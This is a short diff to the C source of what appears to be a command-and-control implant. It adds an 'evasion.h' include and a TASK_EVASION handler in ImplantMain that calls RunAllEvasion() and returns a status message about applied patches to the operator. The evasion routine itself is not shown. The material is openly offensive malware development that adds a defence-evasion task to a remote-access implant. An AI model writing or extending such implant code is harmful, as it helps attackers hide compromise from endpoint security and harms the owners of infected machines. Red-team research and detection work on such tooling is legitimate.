@@ -19,6 +19,7 @@
 #include "api.h"
 #include "msgpack.h"
 #include "strings.h"
+#include "evasion.h"
 #include <winhttp.h>
 #include <bcrypt.h>
 #include <wincrypt.h>
@@ -905,6 +906,16 @@ VOID ImplantMain(PIMPLANT_CONFIG pConfig) {
                         res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, len + 1);
                         memcpy(res->pOutput, szInfo, len);
                         res->dwOutputLen = len;
+                        dwResultCount++;
+                        break;
+                    }
+                    case TASK_EVASION: {
+                        BOOL bOk = RunAllEvasion();
+                        PCHAR msg = bOk ? "evasion: all patches applied" : "evasion: partial failure";
+                        DWORD mlen = (DWORD)strlen(msg);
+                        res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, mlen + 1);
+                        memcpy(res->pOutput, msg, mlen);
+                        res->dwOutputLen = mlen;
                         dwResultCount++;
                         break;
                     }
